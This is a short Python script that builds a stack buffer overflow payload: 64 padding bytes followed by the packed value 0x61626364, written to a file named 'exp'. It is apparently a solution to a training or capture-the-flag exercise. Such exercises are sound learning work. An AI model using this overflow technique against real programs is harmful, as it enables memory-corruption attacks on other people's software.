import struct

padding = b'a'*64
i = struct.pack('I', 0x61626364)

with open('exp', 'wb') as f:
    f.write(padding+i)

